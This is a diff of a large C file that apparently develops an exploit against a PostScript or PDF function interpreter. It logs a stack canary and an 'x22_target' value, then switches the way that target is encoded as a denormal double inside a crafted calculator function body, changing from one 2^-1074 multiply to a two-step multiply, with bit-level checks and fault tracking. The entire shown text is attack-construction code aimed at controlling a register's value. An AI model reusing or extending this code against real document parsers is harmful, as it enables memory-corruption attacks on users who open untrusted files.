@@ -31874,9 +31874,27 @@ static void r508_7c_only(void) {
     rlog("  canary at %p = 0x%08x\n", (void *)&canary, canary);
     rlog("  x22_target = 0x%llx\n", (unsigned long long)x22_target);
 
-    /* Build function body with denormal encoding */
-    char fbuf[80];
-    snprintf(fbuf, sizeof(fbuf), "{ pop %.1f 2 -1074 exp mul", (double)x22_target);
+    /* Verify denormal encoding in C first */
+    {
+        double test_d = (double)x22_target * pow(2.0, -1074.0);
+        uint64_t test_bits;
+        memcpy(&test_bits, &test_d, 8);
+        rlog("  C verify: %.1f * 2^-1074 = bits 0x%016llx (want 0x%016llx)\n",
+            (double)x22_target, (unsigned long long)test_bits,
+            (unsigned long long)x22_target);
+        /* Also try two-step */
+        double test_d2 = (double)x22_target * pow(2.0, -52.0) * pow(2.0, -1022.0);
+        uint64_t test_bits2;
+        memcpy(&test_bits2, &test_d2, 8);
+        rlog("  C verify 2-step: bits 0x%016llx\n",
+            (unsigned long long)test_bits2);
+    }
+
+    /* Build function body with two-step denormal encoding
+       mantissa * 2^-52 * 2^-1022 avoids a single extreme exponent */
+    char fbuf[120];
+    snprintf(fbuf, sizeof(fbuf),
+        "{ pop %.1f 2 -52 exp mul 2 -1022 exp mul", (double)x22_target);
     int fbl2 = (int)strlen(fbuf);
     char *fbody2 = (char *)malloc((size_t)(fbl2 + best_nout * 4 + 4));
     memcpy(fbody2, fbuf, (size_t)fbl2);
@@ -31885,7 +31903,7 @@ static void r508_7c_only(void) {
     }
     fbody2[fbl2++] = ' '; fbody2[fbl2++] = '}'; fbody2[fbl2] = '\0';
 
-    rlog("  body len=%d, first 60: %.60s\n", fbl2, fbody2);
+    rlog("  body len=%d, first 80: %.80s\n", fbl2, fbody2);
     fflush(stdout);
 
     r508_fault_caught = 0;
